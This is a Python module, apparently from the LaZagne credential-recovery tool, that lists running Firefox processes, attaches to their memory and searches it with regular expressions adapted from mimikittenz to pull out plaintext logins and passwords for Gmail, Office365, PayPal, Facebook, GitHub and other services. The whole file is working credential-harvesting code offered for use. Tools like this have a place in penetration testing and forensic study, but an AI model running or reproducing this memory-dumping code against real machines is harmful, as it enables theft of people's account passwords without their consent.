
""" 
The regex patterns are adapted from mimikittenz: https://github.com/putterpanda/mimikittenz
"""

from lazagne.config.module_info import ModuleInfo 
from memorpy import *  # Library for memory manipulation and search

# Define regular expressions for capturing login and password pairs from memory
password_regex = [
    ("Gmail", "&Email=(?P<Login>.{1,99})?&Passwd=(?P<Password>.{1,99})?&PersistentCookie="),
    ("Office365", "login=(?P<Login>.{1,32})&passwd=(?P<Password>.{1,22})&PPSX="),
    ("MicrosoftOneDrive", "login=(?P<Login>.{1,42})&passwd=(?P<Password>.{1,22})&type=.{1,2}&PPFT="),
    ("PayPal", "login_email=(?P<Login>.{1,48})&login_password=(?P<Password>.{1,16})&submit=Log\+In&browser_name"),
    ("Twitter", "username_or_email%5D=(?P<Login>.{1,42})&session%5Bpassword%5D=(?P<Password>.{1,22})&remember_me="),
    ("Facebook", "lsd=.{1,10}&email=(?P<Login>.{1,42})&pass=(?P<Password>.{1,22})&(?:default_)?persistent="),
    ("LinkedIN", "session_key=(?P<Login>.{1,50})&session_password=(?P<Password>.{1,50})&isJsEnabled"),
    ("VirusTotal", "password=(?P<Password>.{1,22})&username=(?P<Login>.{1,42})&next=%2Fen%2F&response_format=json"),
    ("AnubisLabs", "username=(?P<Login>.{1,42})&password=(?P<Password>.{1,22})&login=login"),
    ("Github", "%3D%3D&login=(?P<Login>.{1,50})&password=(?P<Password>.{1,50})"),
]

# List of browser processes to target for password dumping
browser_list = ["firefox"]

class MemoryDump(ModuleInfo):
    def __init__(self):
        # Define module options
        options = {
            'command': '--memdump', 
            'action': 'store_true', 
            'dest': 'memory_dump',
            'help': 'Retrieve browser passwords from memory'
        }
        # Initialize parent class with module name and options
        ModuleInfo.__init__(self, 'memory_dump', 'memory', options)

    def run(self):
        # List to store found credentials
        pwd_found = []

        # Iterate over all running processes on the system
        for process in Process.list():
            # Check if the process name matches one in the browser list
            if process.get('name', '') in browser_list or any([x in process.get('name', '') for x in browser_list]):
                try:
                    # Initialize MemWorker to access the process memory using its PID
                    mw = MemWorker(pid=process.get('pid'))
                except ProcessException:
                    # Skip processes we cannot attach to
                    continue

                # Log which process is being analyzed
                self.info('Dumping passwords from %s (pid: %s) ...' % (process.get('name'), str(process.get('pid'))))

                # Search process memory for patterns defined in `password_regex`
                for _, x in mw.mem_search(password_regex, ftype='groups'):
                    # Extract login and password pairs from search results
                    login, password = x[-2:]
                    # Store the found credentials in a dictionary format
                    pwd_found.append(
                        {
                            'URL': 'Unknown',  # URL is not extracted in this script
                            'Login': login, 
                            'Password': password
                        }
                    )

        # Return the list of found credentials
        return pwd_found
